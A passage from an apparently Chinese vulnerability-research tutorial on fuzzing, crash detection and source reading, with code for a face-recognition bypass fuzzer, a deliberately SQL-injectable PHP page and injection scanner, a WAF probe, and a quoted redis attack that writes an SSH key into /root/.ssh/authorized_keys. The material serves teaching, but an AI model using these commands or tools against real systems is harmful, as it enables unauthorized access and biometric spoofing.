</code></pre>
<p>根据这个内存布局,我们来举几个例子,(为了方便阅读数据顺序是大端字节)</p>
<pre><code>
    0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x02 0x65 0x65 =&gt; 0 | 2 | AA
    0x00 0x00 0xFF 0x00 0x00 0x00 0x00 0x04 0x01 0x02 0x03 0x04 =&gt; 0xFF00 | 4 | 0x01 0x02 0x03 0x04
    0x1d 0xb2 0xaa 0x42 0x00 0x21 0xd2 0x23 0x65 =&gt; 0x1db2aa42 | 0x21d223 | A
    ...

</code></pre>
<p>前面两个例子是按照格式构造的,最后那个例子是瞎写的.用前面提到的两种方式(随机生成数据和按结构生成数据)来生成Fuzzing 数据,例子如下</p>
<pre><code>
    按结构生成数据:random.randint() | random.randint() | random.randstring(4)
    随机生成数据:random.randstring(12)

</code></pre>
<p>不知道读者们有没有注意到非常重要的一点,这两条例子是等价的.也就是说<code>random.randint() | random.randint() | random.randstring(4)</code> 等价于<code>random.randstring(12)</code> .所以这个时候按结构生成数据的意义就没有了,我们来看一下ImageMagick 的图片解析部分代码<code>coders/icon.c:295</code></p>
<pre><code class="language-c">
    icon_file.reserved=(short) ReadBlobLSBShort(image);
    icon_file.resource_type=(short) ReadBlobLSBShort(image);
    icon_file.count=(short) ReadBlobLSBShort(image);
    if ((icon_file.reserved != 0) ||
      ((icon_file.resource_type != 1) &amp;&amp; (icon_file.resource_type != 2)) ||
      (icon_file.count &gt; MaxIcons))
        ThrowReaderException(CorruptImageError,&quot;ImproperImageHeader&quot;);
    extent=0;
    for (i=0; i &lt; icon_file.count; i++)
    {
        icon_file.directory[i].width=(unsigned char) ReadBlobByte(image);
        icon_file.directory[i].height=(unsigned char) ReadBlobByte(image);
        icon_file.directory[i].colors=(unsigned char) ReadBlobByte(image);
        icon_file.directory[i].reserved=(unsigned char) ReadBlobByte(image);
        icon_file.directory[i].planes=(unsigned short) ReadBlobLSBShort(image);
        icon_file.directory[i].bits_per_pixel=(unsigned short)
          ReadBlobLSBShort(image);
        icon_file.directory[i].size=ReadBlobLSBLong(image);
        icon_file.directory[i].offset=ReadBlobLSBLong(image);
        if (EOFBlob(image) != MagickFalse)
          break;
        extent=MagickMax(extent,icon_file.directory[i].size);
    }

</code></pre>
<p>这部分的代码相当于按照这个格式来读取数据</p>
<pre><code>
    short | short | short | [ Byte | Byte | Byte | Byte | long | long ] | [ Byte | Byte | Byte | Byte | long | long ] | ...

</code></pre>
<p>所以,直接使用random.randstring() 直接生成随机数据传递到这里Fuzzing 即可,无需再按结构生成数据.</p>
<p>回到这个小节提出的问题:那么什么时候选择随机生成数据,什么时候选择按结构生成数据呢?<strong>如果输入是有限制的,那就按结构生成数据,如果输入是无限制的,那就随机生成数据;如果按结构生成数据可以触发更多的代码执行,那就按结构生成数据,否则就使用随机生成数据</strong>.</p>
<h2 id="结尾"><a class="header" href="#结尾">结尾</a></h2>
<p>阅读源码是一个非常有用的技能,<strong>绝大多数的疑惑,都能在源码里面找到</strong>,这是以前在腾讯的一位T3 的同事给我的教诲,受益至今.前面用了很多的篇幅,介绍了Fuzzing 和阅读源码之间的关系是有多么重要.希望这些经验能够帮助在学习挖掘漏洞的读者们.本章是偏向于二进制的Fuzzing 的,关于二进制还有一些其他的Fuzzing 经验和大家分享.</p>
<p><img src="pic2/tips.png" alt="" /></p>
<h2 id="afl-和libfuzzer-的演示"><a class="header" href="#afl-和libfuzzer-的演示">AFL 和libFuzzer 的演示</a></h2>
<p>多开AFL Fuzzing 库</p>
<p><img src="pic2/afl.png" alt="" /></p>
<p>跑到内存异常的libFuzzer</p>
<p><img src="pic2/libfuzzer.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="5-fuzzing-模糊测试之异常检测"><a class="header" href="#5-fuzzing-模糊测试之异常检测">5. Fuzzing 模糊测试之异常检测</a></h1>
<ul>
<li><a href="3.Fuzzing.html#%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7">必备工具</a></li>
<li><a href="3.Fuzzing.html#fuzzing-%E7%9A%84%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B">Fuzzing 的异常检测</a>
<ul>
<li><a href="3.Fuzzing.html#%E6%A3%80%E6%B5%8B%E8%BE%93%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BC%82%E5%B8%B8">检测输出数据异常</a></li>
<li><a href="3.Fuzzing.html#%E6%A3%80%E6%B5%8B%E8%BF%90%E8%A1%8C%E5%BC%82%E5%B8%B8">检测运行异常</a></li>
</ul>
</li>
</ul>
<h2 id="必备工具-2"><a class="header" href="#必备工具-2">必备工具</a></h2>
<p>Python ,Python-face_recognition ,PHP ,Python-Requests ,Pydasm ,Pydbg</p>
<h2 id="fuzzing-的异常检测"><a class="header" href="#fuzzing-的异常检测">Fuzzing 的异常检测</a></h2>
<p>上一章的结尾部分提到,程序运行包含:输入-&gt;解析-&gt;内部逻辑处理-&gt;数据组装-&gt;输出,每一个部分都可能存在漏洞.总结一下Fuzzing 的异常检测分为两种:检测输出数据异常和检测运行异常.</p>
<h3 id="检测输出数据异常"><a class="header" href="#检测输出数据异常">检测输出数据异常</a></h3>
<p>程序需要依赖用户输入,然后进行处理,最后再输出程序处理的数据.以人脸识别为例子,我们同样可以使用Fuzzing 来让识别算法判断两个人脸为同一个人.先来看一下Python 库<code>face_recognition</code> 是怎么做识别的.</p>
<pre><code class="language-python">
    def compare_faces(known_face_encodings, face_encoding_to_check, tolerance=0.6):
        &quot;&quot;&quot;
        Compare a list of face encodings against a candidate encoding to see if they match.

        :param known_face_encodings: A list of known face encodings
        :param face_encoding_to_check: A single face encoding to compare against the list
        :param tolerance: How much distance between faces to consider it a match. Lower is more strict. 0.6 is typical best performance.
        :return: A list of True/False values indicating which known_face_encodings match the face encoding to check
        &quot;&quot;&quot;
        return list(face_distance(known_face_encodings, face_encoding_to_check) &lt;= tolerance)

</code></pre>
<p>compare_faces() 函数根据face_distance() 函数对比两张图片的相似度做对比,当相似度小于默认值0.6 时,数值越小两张人脸越相同,即判断为同一个人.让两张不是同一个人的识别成为同一个人,本质上是干扰人脸识别算法的判断概率.<strong>只需要对每一个像素点做极小的修改,就能影响数据点被分类的结果.必定存在一个与原本数据相差极小而被判断为任意一个类别的数据</strong>.简单地来说,通过在脸部附近随机生成一些像素点,会影响到最终识别结果.Fuzzer 构造如下</p>
<pre><code class="language-python">
    import random

    from numpy import array
    from PIL import Image
    from PIL import ImageDraw

    import face_recognition


    def load_image_encoding(file_path) :
        image = face_recognition.load_image_file(file_path)
        image_encoding = face_recognition.face_encodings(image)[0]

        return image_encoding

    def get_face_location(file_path) :
        image = face_recognition.load_image_file(file_path)
        face_location = face_recognition.face_locations(image)[0]

        return face_location

    def fuzzing(source_image_path = 'obama/obama.jpg',fuzzing_image_path = 'ponyma/ponyma.png',target_compare_rate = 0.4) :
        source_face_data = load_image_encoding(source_image_path)
        image = Image.open(fuzzing_image_path)
        draw = ImageDraw.Draw(image)
        last_best_compare_rate = 1
        face_location = get_face_location(fuzzing_image_path)  #  获取人脸位置
        random_fuzzing_location_top = face_location[0]
        random_fuzzing_location_bottom = face_location[2]
        random_fuzzing_location_left = face_location[3]
        random_fuzzing_location_right = face_location[1]

        while True :
            random_pixel_data = (random.randint(0,255),  #  随机像素值
                                 random.randint(0,255),
                                 random.randint(0,255))
            random_location = (random.randint(random_fuzzing_location_left,random_fuzzing_location_right),  #  随机位置
                               random.randint(random_fuzzing_location_top,random_fuzzing_location_bottom))
            last_pixel_data = image.getpixel(random_location)

            draw.point(random_location,random_pixel_data)  #  在人脸的区域上随机画一个像素

            fuzzing_face_image = image.convert('RGB')
            fuzzing_face_array = array(fuzzing_face_image)
            fuzzing_face_data = face_recognition.face_encodings(fuzzing_face_array)[0]
            compare_rate = face_recognition.face_distance([source_face_data],fuzzing_face_data)  #  重新对比两个人脸

            print 'Compare Rate =',compare_rate,' Random Location =',random_location,' Random Pixel Data =',random_pixel_data

            del fuzzing_face_image  #  防止内存泄漏 ..
            del fuzzing_face_array
            del fuzzing_face_data

            if compare_rate &lt; target_compare_rate :  #  两张人脸识别结果的判断率达到要求之后,就退出
                break

            if compare_rate &lt; last_best_compare_rate :  #  如果随机的像素没有提升识别率,那就恢复原来的那个像素,如果有提升识别率,那就保存这个像素
                last_best_compare_rate = compare_rate

                print 'New Study Rate:' ,last_best_compare_rate
            else :
                draw.point(random_location,last_pixel_data)

        image.save(fuzzing_image_path + '_bypass_check.jpg')


    obama_image = face_recognition.load_image_file('obama/obama.jpg')
    obama1_image = face_recognition.load_image_file('obama/obama2.jpg')
    ponyma_image = face_recognition.load_image_file('ponyma/ponyma.png')
    ponyma1_image = face_recognition.load_image_file('ponyma/ponyma.png_bypass_check.jpg')

    obama_encoding = face_recognition.face_encodings(obama_image)[0]
    obama1_encoding = face_recognition.face_encodings(obama1_image)[0]
    ponyma_image = face_recognition.face_encodings(ponyma_image)[0]
    ponyma1_image = face_recognition.face_encodings(ponyma1_image)[0]

    print 'Obama Test:'
    print face_recognition.compare_faces([obama_encoding], obama1_encoding),\
          face_recognition.face_distance([obama_encoding], obama1_encoding)
    print 'PonyMa test:'
    print face_recognition.compare_faces([obama_encoding], ponyma_image),\
          face_recognition.face_distance([obama_encoding], ponyma_image)
    print 'PonyMa Bypass test:'
    print face_recognition.compare_faces([obama_encoding], ponyma1_image),\
          face_recognition.face_distance([obama_encoding], ponyma1_image)

    print 'Ready Fuzzing ..'

    fuzzing()

</code></pre>
<p>运行过程与结果</p>
<p><img src="pic3/study.gif" alt="" /></p>
<p><img src="pic3/study2.gif" alt="" /></p>
<p><img src="pic3/valid.png" alt="" /></p>
<p>看到这里,相信读者应该理解到:<strong>用户的输入是不可信的,精心构造的输入会影响程序的输出结果甚至远程代码执行</strong>.下面再举一个SQL 注入的例子,先来看看页面的源码</p>
<pre><code class="language-php">
    &lt;?php

        $connect = mysql_connect('localhost','root','root');

        mysql_select_db('test', $connect);

        $query  = 'SELECT * FROM user WHERE name = &quot;' . $_REQUEST['name'] . '&quot;';
        $result = mysql_query($query) or die('&lt;pre&gt;'.mysql_error().'&lt;/pre&gt;');

        while($row = mysql_fetch_array($result)) {
          echo $row['0'] . ' ' . $row['1'];
          echo '&lt;br /&gt;';
        }

        echo '&lt;br/&gt;';
        echo $query;
        mysql_close($connect);

    ?&gt;

</code></pre>
<p>访问URL:http://127.0.0.1/sql.php?name=root ,页面返回的数据如下</p>
<p><img src="pic3/php_sql_result1.png" alt="" /></p>
<p>此时我们在root 后面加上&quot; ,URL 变为:http://127.0.0.1/sql.php?name=root&quot; ,再次访问链接</p>
<p><img src="pic3/php_sql_result2.png" alt="" /></p>
<p>可以看到,现在SQL 语句出现异常了.对于URL 进行做SQL 注入Fuzzing ,我们通过<code>' &quot;</code> 这两个符号插入到URL 的参数里来判断能否导致SQL 字符串闭合异常.Fuzzer 代码如下:</p>
<pre><code class="language-python">
    import sys

    import requests


    def get_url_path(url) :
        argument_offset = url.find('?')

        if -1 == argument_offset :
            return False

        url = url[ : argument_offset ]

        return url

    def get_url_argument(url) :
        argument_offset = url.find('?')

        if -1 == argument_offset :
            return False

        url = url[ argument_offset + 1 : ]
        argument = url.split('&amp;')

        return argument

    def check_url_inject(url_path,url_argument) :
        sql_inject_flag = [ '\'' , '&quot;' ]
        sql_inject_error_flag = 'SQL syntax'
        inject_result = False

        for url_argument_index in url_argument :
            for sql_inject_flag_index in sql_inject_flag :
                responed = requests.get(url_path + '?' + url_argument_index + sql_inject_flag_index)

                if not -1 == responed.text.find(sql_inject_error_flag) :
                    inject_result = True

                    break

        return inject_result


    if __name__ == '__main__' :
        if not 2 == len(sys.argv) :
            print 'sql.py URL'

            exit()

        url = sys.argv[1]
        url_argument = get_url_argument(url)
        url_path = get_url_path(url)

        print 'Is Inject:' ,check_url_inject(url_path,url_argument)

</code></pre>
<p>运行结果如下</p>
<p><img src="pic3/sql_inject.png" alt="" /></p>
<p>同样的原理,我们来做WAF 检测,示例URL:https://cloud.tencent.com/ .如果URL 里面还有敏感Payload 时,腾讯云的WAF 会返回501 的回应,否则会返回正常的请求</p>
<pre><code class="language-python">
    import sys

    import requests


    def check_waf(url_path) :
        responed = requests.get(url_path + '?test=&lt;script&gt;')

        if 501 == responed.status_code :
            return True

        return False


    if __name__ == '__main__' :
        if not 2 == len(sys.argv) :
            print 'sql.py URL'

            exit()

        print 'Has WAF:' ,check_waf(sys.argv[1])

</code></pre>
<p>基于这段检测数据输出的代码,我们可以来做WAF Fuzzing 测试,看看哪些Payload 是无法被拦截的,关于WAF 的Fuzzing 以后再写一些东西</p>
<h3 id="检测运行异常"><a class="header" href="#检测运行异常">检测运行异常</a></h3>
<p>检测运行异常在二进制上应用比较多,回顾上一章的Python 运行环境Fuzzing ,Fuzzer 只做了一个数据输入的生成,具体崩溃点还不知道在哪个位置,现在我们就使用PyDbg 和PyDasm 来自动化检测异常,关于PyDbg 我整理过一个使用文档,更多信息可以参考这里:https://github.com/lcatro/PyDbg_Document .下面使用PyDbg 来编写Python 运行环境Fuzzing 的异常检测模块</p>
<pre><code class="language-python">
    EXCEPTION_STACK_OVERFLOW=0xC00000FD  #  栈溢出异常,这个值PyDbg 里没有,是自己加上去的

    def get_exception(EXCEPTION) :  #  判断异常类型
        if EXCEPTION==EXCEPTION_STACK_OVERFLOW :
            return 'EXCEPTION_STACK_OVERFLOW'
        elif EXCEPTION==pydbg.defines.EXCEPTION_ACCESS_VIOLATION :
            return 'EXCEPTION_ACCESS_VIOLATION'
        elif EXCEPTION==pydbg.defines.EXCEPTION_GUARD_PAGE :
            return 'EXCEPTION_GUARD_PAGE'
        return 'Unknow Exception!'

    def get_instruction(self,address) :  #  获取指定地址附近的汇编代码
        for ins in self.disasm_around(address,10) :
            if ins[0]==address :
                print '-&gt;Add:'+str(hex(ins[0]))[:-1]+'-'+ins[1]
            else :
                print '  Add:'+str(hex(ins[0]))[:-1]+'-'+ins[1]

    def format_output(memory_data) :  #  格式化输出内存数据
        output_string=''
        for memory_data_index in memory_data :
            output_string+=str(hex(ord(memory_data_index)))+' '
        return output_string

    def dump_crash(self,EXCEPTION,EIP,EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI,instruction) :  #  输出崩溃信息
        print 'WARNING! Exploit:',get_exception(EXCEPTION),str(hex(EIP))[:-1],instruction,'\n'
        get_instruction(self,EIP)
        print ''
        print 'EAX:'+str(hex(EAX))[:-1],'EBX:'+str(hex(EBX))[:-1],'ECX:'+str(hex(ECX))[:-1],'EDX:'+str(hex(EDX))[:-1],'ESP:'+str(hex(ESP))[:-1],'EBP:'+str(hex(EBP))[:-1],'ESI:'+str(hex(ESI))[:-1],'EDI:'+str(hex(EDI))[:-1]
        print 'Easy Debug Viewer:'
        print 'command:-r %regesit% (look regesit) ;-a %address% (look memory address) ;-u %address% (get instruction) ;-quit (will exit)'

        while True :  #  这里有个内置调试器,支持一些手工调试功能
            try :
                command=raw_input('-&gt;')
                if command[:2]=='-r' :  #  获取寄存器
                    print str(hex(self.get_register(str.upper(command[3:]))))[:-1]
                elif command[:2]=='-a' :  #  获取数据
                    dump_data=self.read(eval(command[3:]),DUMP_DATA_LENGTH)
                    print format_output(dump_data)
                    print dump_data
                elif command[:2]=='-u' :  #  获取代码
                    get_instruction(self,eval(command[3:]))
                elif command[:5]=='-quit' :  #  退出
                    break
            except :
                print 'Making a Except may input a error data'

    def check_valueble_crash(self,EXCEPTION) :  #  获取异常崩溃信息
        EIP=self.get_register('EIP')
        EAX=self.get_register('EAX')
        EBX=self.get_register('EBX')
        ECX=self.get_register('ECX')
        EDX=self.get_register('EDX')
        ESP=self.get_register('ESP')
        EBP=self.get_register('EBP')
        ESI=self.get_register('ESI')
        EDI=self.get_register('EDI')
        instruction=self.disasm(EIP)

        if 'call'==instruction[0:4] :
            dump_crash(self,EXCEPTION,EIP,EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI,instruction)
        elif 'mov'==instruction[0:3] :
            dump_crash(self,EXCEPTION,EIP,EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI,instruction)
        elif 'pop'==instruction[0:3] :
            dump_crash(self,EXCEPTION,EIP,EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI,instruction)
        elif 'push'==instruction[0:4] :
            dump_crash(self,EXCEPTION,EIP,EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI,instruction)
        elif EXCEPTION==EXCEPTION_STACK_OVERFLOW :
            dump_crash(self,EXCEPTION,EIP,EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI,instruction)

    def crash_recall_guard_page(self) :  #  捕获程序异常的回调函数,参数self 是Pydbg 的对象
        check_valueble_crash(self,pydbg.defines.EXCEPTION_GUARD_PAGE)

    def crash_recall_access_violation(self) :
        check_valueble_crash(self,pydbg.defines.EXCEPTION_ACCESS_VIOLATION)

    def crash_recall_exit_process(self) :
        check_valueble_crash(self,pydbg.defines.EXIT_PROCESS_DEBUG_EVENT)

    def crash_recall_stack_overflow(self) :
        check_valueble_crash(self,EXCEPTION_STACK_OVERFLOW)


    if __name__ == '__main__' :
        while True :
            code_object = make_code_object(make_opcode_stream())

            save_to_pyc('python_fuzzing.tmp.pyc',code_object)

            debugger = pydbg.pydbg()  #  初始化PyDbg

            debugger.set_callback(pydbg.defines.EXCEPTION_ACCESS_VIOLATION,crash_recall_access_violation)  #  设置异常回调
            debugger.set_callback(pydbg.defines.EXCEPTION_GUARD_PAGE,crash_recall_guard_page)
            debugger.set_callback(pydbg.defines.EXIT_PROCESS_DEBUG_EVENT,crash_recall_exit_process)
            debugger.set_callback(EXCEPTION_STACK_OVERFLOW,crash_recall_stack_overflow)

            debugger.load('C:\\Python27\\python.exe','python_fuzzing.tmp.pyc')  #  把生成的样本传递进来Fuzzing
            debugger.run()  #  启动调试

            time.sleep(3)

            del debugger  #  删除PyDbg

</code></pre>
<p>运行效果</p>
<p><img src="pic3/debug_version_fuzzer.png" alt="" /></p>
<p>PyDbg 不是一个好的选择,因为有一些buffer overflow 必须要改写到其他数据并且又要被引用才会触发异常,事实上有很多情况是越界读写并没有被检测出来.最好的选择还是使用ASAN ,ASAN 自带有很强大的内存检测方式,ASAN 需要在编译的时候使用<code>-fsanitize=address</code> 参数引入,但是使用ASAN 需要依赖源码.在没有源码只有执行文件的情况下,linux 平台使用valgrind ,windows 平台使用gflags 来做内存异常检测.</p>
<p>使用ASAN 做检测就方便很多了,下面是ASAN 检测内存泄漏和越界的例子(检测程序为bfgminer)</p>
<p><img src="pic3/load_config_memory_leak.png" alt="" /></p>
<p><img src="pic3/probe_device_thread_overflow.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="6-阅读源码"><a class="header" href="#6-阅读源码">6. 阅读源码</a></h1>
<ul>
<li><a href="4.source-code.html#%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7">必备工具</a></li>
<li><a href="4.source-code.html#%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E5%88%B0%E6%BA%90%E7%A0%81%E5%B1%82%E4%B8%8A%E7%9A%84%E7%90%86%E8%A7%A3">从一个利用思路到源码层上的理解</a></li>
<li><a href="4.source-code.html#%E4%BB%8E%E4%B8%80%E4%B8%AA%E6%BC%8F%E6%B4%9Ecommit-%E5%88%B0%E7%90%86%E8%A7%A3%E8%BF%99%E4%B8%80%E7%B1%BB%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E5%BC%8F">从一个漏洞Commit 到理解这一类的漏洞挖掘方式</a></li>
<li><a href="4.source-code.html#%E7%BB%93%E5%90%88poc-%E5%92%8C%E6%BA%90%E7%A0%81%E6%9D%A5%E7%90%86%E8%A7%A3%E8%BF%99%E7%B1%BB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86">结合PoC 和源码来理解这类漏洞的原理</a></li>
<li><a href="4.source-code.html#%E7%BB%93%E5%B0%BE">结尾</a></li>
</ul>
<p>读代码要带有目的去读,是要挖漏洞还是想要了解这个程序到在底干了些什么</p>
<p>要理解整体的时候,千万不要在某个细节里钻牛角尖</p>
<p>要一边理解细节一边挖洞的时候,记得要联想到所有可能的情况</p>
<h2 id="必备工具-3"><a class="header" href="#必备工具-3">必备工具</a></h2>
<p>Source Insight ,redis 源码,VS2017 ,Chakra 源码 ,Struts2 源码</p>
<h2 id="从一个利用思路到源码层上的理解"><a class="header" href="#从一个利用思路到源码层上的理解">从一个利用思路到源码层上的理解</a></h2>
<p>本节从一个redis 提权思路开始一步步分析,原文地址:https://www.huangdc.com/443 .这篇文章主要说的是,找到了未授权的redis 然后使用<code>config</code> 命令进行ssh key 的替换,使得攻击者可以使用ssh 免密码登陆的方式 直接getshell .我们看看文章里的关键部分</p>
<pre><code class="language-bash">
    [root@vm200-78 ~]# cat mypubkey.txt |redis-cli -h 192.168.203.224 -p 4700 -x set mypubkey
    OK
    [root@vm200-78 ~]# redis-cli -h 192.168.203.224 -p 4700
    redis 192.168.203.224:4700&gt; config set dir /root/.ssh/
    OK
    redis 192.168.203.224:4700&gt; config set dbfilename &quot;authorized_keys&quot;
    OK
    redis 192.168.203.224:4700&gt; save
    OK
    redis 192.168.203.224:4700&gt;

</code></pre>
<p>把mypubkey.txt 的内容写入到了mypubkey 之后,然后使用<code>config set dir</code> 改变数据保存目录,再使用<code>config set dbfilename &quot;authorized_keys&quot;</code> 改变数据保存文件名,接下来使用<code>save</code> 进行数据保存,把ssh key 保存到/root/.ssh 中,下载好redis 的源码,我们来探索一下</p>
<p>这个命令叫config ,那么我们到Github 上来搜索有config 的地方</p>
<p><img src="pic4/github_find_config.png" alt="" /></p>
<p><img src="pic4/github_find_config1.png" alt="" /></p>
<p>有config 字符串的地方太多了,我们换一个来搜索,找save 命令</p>
<p><img src="pic4/github_find_save.png" alt="" /></p>
<p><img src="pic4/github_find_save1.png" alt="" /></p>
<p>搜索save 的结果不是很多,在第二页就可以找到所有命令的声名了</p>
<p><img src="pic4/github_find_save2.png" alt="" /></p>
<p>接下来我们来看看<code>src/server.c</code> 的代码,搜索saveCommand</p>
<p><img src="pic4/github_find_save3.png" alt="" /></p>
<p>现在可以进一步确定这个地方是命令声名的地方,<code>save</code> 是命令的字符串,<code>saveCommand</code> 是命令的入口点,那么我们搜索<code>config</code></p>
<p><img src="pic4/github_find_config2.png" alt="" /></p>
<p>现在能够定位到<code>config</code> 命令的入口函数了,继续搜索configCommand</p>
<p><img src="pic4/github_find_config3.png" alt="" /></p>
<p>定位到configCommand 函数在<code>src/config.c</code> ,进去源码文件继续查找</p>
<p><img src="pic4/github_find_config4.png" alt="" /></p>
<p>找到configCommand ,源码如下:</p>
<pre><code class="language-c">
    void configCommand(client *c) {
        /* Only allow CONFIG GET while loading. */
        if (server.loading &amp;&amp; strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;get&quot;)) {
            addReplyError(c,&quot;Only CONFIG GET is allowed during loading&quot;);
            return;
        }

        if (c-&gt;argc == 2 &amp;&amp; !strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;help&quot;)) {
            const char *help[] = {
                &quot;get &lt;pattern&gt; -- Return parameters matching the glob-like &lt;pattern&gt; and their values.&quot;,
                &quot;set &lt;parameter&gt; &lt;value&gt; -- Set parameter to value.&quot;,
                &quot;resetstat -- Reset statistics reported by INFO.&quot;,
                &quot;rewrite -- Rewrite the configuration file.&quot;,
                NULL
            };
            addReplyHelp(c, help);
        } else if (!strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;set&quot;) &amp;&amp; c-&gt;argc == 4) {  //  注意这里,config set 命令
            configSetCommand(c);
        } else if (!strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;get&quot;) &amp;&amp; c-&gt;argc == 3) {
            configGetCommand(c);
        } else if (!strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;resetstat&quot;) &amp;&amp; c-&gt;argc == 2) {
            resetServerStats();
            resetCommandTableStats();
            addReply(c,shared.ok);
        } else if (!strcasecmp(c-&gt;argv[1]-&gt;ptr,&quot;rewrite&quot;) &amp;&amp; c-&gt;argc == 2) {
            if (server.configfile == NULL) {
                addReplyError(c,&quot;The server is running without a config file&quot;);
                return;
            }
            if (rewriteConfig(server.configfile) == -1) {
                serverLog(LL_WARNING,&quot;CONFIG REWRITE failed: %s&quot;, strerror(errno));
                addReplyErrorFormat(c,&quot;Rewriting config file: %s&quot;, strerror(errno));
            } else {
                serverLog(LL_WARNING,&quot;CONFIG REWRITE executed with success.&quot;);
                addReply(c,shared.ok);
            }
        } else {
             addReplyErrorFormat(c, &quot;Unknown subcommand or wrong number of arguments for '%s'. Try CONFIG HELP&quot;,
                (char*)c-&gt;argv[1]-&gt;ptr);
            return;
        }
    }

</code></pre>
<p>继续对<code>configSetCommand()</code> 函数进行跟踪,在<code>src/config.c:837</code> 行代码,由于代码量比较多,在此挑选一些比较重点的地方来说</p>
<pre><code class="language-c">
    void configSetCommand(client *c) {
        robj *o;
        long long ll;
        int err;
        serverAssertWithInfo(c,c-&gt;argv[2],sdsEncodedObject(c-&gt;argv[2]));
        serverAssertWithInfo(c,c-&gt;argv[3],sdsEncodedObject(c-&gt;argv[3]));
        o = c-&gt;argv[3];

        if (0) { /* this starts the config_set macros else-if chain. */

        /* Special fields that can't be handled with general macros. */
        config_set_special_field(&quot;dbfilename&quot;) {  //  命令config set dbfilename
            if (!pathIsBaseName(o-&gt;ptr)) {  //
                addReplyError(c, &quot;dbfilename can't be a path, just a filename&quot;);
                return;
            }
            zfree(server.rdb_filename);
            server.rdb_filename = zstrdup(o-&gt;ptr);

        //  ...

        } config_set_special_field(&quot;dir&quot;) {  //  命令config set dir
            if (chdir((char*)o-&gt;ptr) == -1) {
                addReplyErrorFormat(c,&quot;Changing directory: %s&quot;, strerror(errno));
                return;
            }
        }

        //  ...
    }

</code></pre>
<p><code>config set dir</code> 这个命令很好理解,就是改变当前运行目录路径.<code>config set dbfilename</code> 则是设置redis 服务器的rdb_filename 字段.明白了<code>config set</code> 的工作原理之后,回来再看看<code>save</code> 命令.使用上面的方法找到<code>saveCommand()</code> 函数,在<code>src/rdb.c:2073</code> 行.</p>
<pre><code class="language-c">
    void saveCommand(client *c) {
        if (server.rdb_child_pid != -1) {
            addReplyError(c,&quot;Background save already in progress&quot;);
            return;
        }
        rdbSaveInfo rsi, *rsiptr;
        rsiptr = rdbPopulateSaveInfo(&amp;rsi);
        if (rdbSave(server.rdb_filename,rsiptr) == C_OK) {
            addReply(c,shared.ok);
        } else {
            addReply(c,shared.err);
        }
    }

</code></pre>
<p>我们再来找找<code>rdbSave()</code> 函数.<code>CTRL + F</code> 搜素一下有没有在当前的代码文件里.</p>
<p><img src="pic4/github_find_rdbsave.png" alt="" /></p>
<p>同一个文件上有很多rdbSave 的关键字,我们要找的是函数声明,那么加上一个<code>(</code> 符号,搜素字符串<code>rdbSave(</code></p>
<p><img src="pic4/github_find_rdbsave1.png" alt="" /></p>
<p>这样搜素出来的结果就少很多,往上找一找,就能够直接定位到<code>rdbSave()</code> 函数,在<code>src/rdb.c:1042</code> 行</p>
<pre><code class="language-c">
    /* Save the DB on disk. Return C_ERR on error, C_OK on success. */
    int rdbSave(char *filename, rdbSaveInfo *rsi) {
        char tmpfile[256];
        char cwd[MAXPATHLEN]; /* Current working dir path for error messages. */
        FILE *fp;
        rio rdb;
        int error = 0;

        snprintf(tmpfile,256,&quot;temp-%d.rdb&quot;, (int) getpid());  //  生成一个临时文件名
        fp = fopen(tmpfile,&quot;w&quot;);  //  创建文件
        if (!fp) {
            char *cwdp = getcwd(cwd,MAXPATHLEN);
            serverLog(LL_WARNING,
                &quot;Failed opening the RDB file %s (in server root dir %s) &quot;
                &quot;for saving: %s&quot;,
                filename,
                cwdp ? cwdp : &quot;unknown&quot;,
                strerror(errno));
            return C_ERR;
        }

        rioInitWithFile(&amp;rdb,fp);
        if (rdbSaveRio(&amp;rdb,&amp;error,RDB_SAVE_NONE,rsi) == C_ERR) {  //  保存数据到文件
            errno = error;
            goto werr;
        }

        /* Make sure data will not remain on the OS's output buffers */
        if (fflush(fp) == EOF) goto werr;
        if (fsync(fileno(fp)) == -1) goto werr;
        if (fclose(fp) == EOF) goto werr;  //  关闭文件

        /* Use RENAME to make sure the DB file is changed atomically only
         * if the generate DB file is ok. */
        if (rename(tmpfile,filename) == -1) {  //  重命名文件
            char *cwdp = getcwd(cwd,MAXPATHLEN);
            serverLog(LL_WARNING,
                &quot;Error moving temp DB file %s on the final &quot;
                &quot;destination %s (in server root dir %s): %s&quot;,
                tmpfile,
                filename,
                cwdp ? cwdp : &quot;unknown&quot;,
                strerror(errno));
            unlink(tmpfile);
            return C_ERR;
        }

        serverLog(LL_NOTICE,&quot;DB saved on disk&quot;);
        server.dirty = 0;
        server.lastsave = time(NULL);
        server.lastbgsave_status = C_OK;
        return C_OK;

    werr:
        serverLog(LL_WARNING,&quot;Write error saving DB on disk: %s&quot;, strerror(errno));
        fclose(fp);
        unlink(tmpfile);
        return C_ERR;
    }

</code></pre>
<p>看完了上面的代码之后,我们知道:fopen 会在当前目录下生成一个临时文件来保存数据,那么通过<code>config set dir</code> 改变目录到<code>/root/.ssh/</code> ,<code>fopen()</code> 函数就会在<code>/root/.ssh/</code> 目录下生成文件.我们来看看<code>rdbSave()</code> 函数重命名文件部分的代码</p>
<pre><code class="language-c">
    if (rename(tmpfile,filename) == -1) {  //  重命名文件
        char *cwdp = getcwd(cwd,MAXPATHLEN);

        // ...

        unlink(tmpfile);
        return C_ERR;
    }

</code></pre>
<p>filename 是rdbSave 函数的参数</p>
<pre><code class="language-c">
